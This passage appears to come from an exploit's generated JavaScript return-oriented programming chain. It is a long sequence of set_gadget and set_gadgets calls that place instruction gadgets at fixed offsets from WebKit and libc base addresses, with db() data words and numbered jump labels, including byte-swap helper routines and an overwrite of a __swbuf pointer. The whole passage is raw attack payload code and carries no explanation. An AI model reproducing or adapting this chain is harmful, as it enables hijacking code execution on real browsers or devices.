ropchain+176536, //L2716
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176504, //L2714
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2714:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2715:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2716:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176640, //L2717
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176672, //L2719
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+176656, //L2718
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2717:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2718:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+176768, //L2720
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176784, //L2721
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2720:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2721:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+176896, //L2722
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176880, //L2723
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2723:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2722:
db([0, 0]); // 0x0
//L2689:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+176984, //L2725
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+176968, //L2724
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2724:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2725:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+177080, //L2726
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177096, //L2727
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2726:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+177208, //L2728
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177192, //L2729
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2729:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2728:
db([0, 0]); // 0x0
//L2713:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
__swbuf_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178536, //L2730
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2730:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+178608, //L2732
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+178696, //L2733
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178712, //L2735
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2733:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2735:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2736:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+178832, //L2739
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178816, //L2737
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2737:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2739:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+178936, //L2740
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178968, //L2742
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+178952, //L2741
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2740:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2741:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2742:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179064, //L2743
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179080, //L2744
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2744:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179192, //L2745
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179176, //L2746
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2746:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2745:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+179280, //L2748
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+179264, //L2747
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2747:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179376, //L2749
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179392, //L2750
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2749:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2750:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179504, //L2751
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179488, //L2752
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2752:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2751:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+179576, //L2754
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+179664, //L2755
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179680, //L2757
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2755:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2757:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2758:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+179800, //L2761
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179784, //L2759
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2759:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+179968, //L2764
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179984, //L2765
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179952, //L2762
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+179936, //L2763
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2763:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2762:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2764:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2765:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+180144, //L2769
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+180096, //L2767
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+180128, //L2768
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2767:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2766:
db([32, 0]); // 0x20
set_gadget(libc_base+206806,); //pop rdi
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+180256, //L2770
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180288, //L2772
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+180272, //L2771
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2770:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2771:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2772:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180384, //L2773
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180400, //L2774
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2773:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2774:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180512, //L2775
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180496, //L2776
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2776:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+180600, //L2778
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+180584, //L2777
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2778:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180696, //L2779
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180712, //L2780
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2779:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2780:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180824, //L2781
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180808, //L2782
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2782:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2781:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180896, //L2784
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2784:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+180984, //L2785
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181000, //L2787
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2785:
db([0, 0]); // 0x0
set_gadget(webkit_base+432898,); //pop r8
//L2787:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2788:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181120, //L2791
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181104, //L2789
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2789:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2791:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+181280, //L2795
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181232, //L2793
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181264, //L2794
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2793:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2792:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L2794:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2795:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+181336, //L2797
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2797:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+181440, //L2799
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181472, //L2800
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181456, //L2798
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2799:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2798:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2800:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+181632, //L2804
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181584, //L2802
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181616, //L2803
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2802:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2801:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2804:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+181736, //L2806
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181720, //L2805
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2805:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2806:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2807:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2808:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+181944, //L2811
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181912, //L2810
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2810:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2809:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+182048, //L2813
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182032, //L2812
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+182128, //L2814
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2814:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2816:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+182248, //L2819
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182232, //L2817
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2817:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2819:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+182408, //L2823
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182360, //L2821
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+182392, //L2822
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2821:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2820:
db([16, 0]); // 0x10
set_gadget(libc_base+206806,); //pop rdi
//L2822:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2823:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+182464, //L2825
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2825:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+182568, //L2827
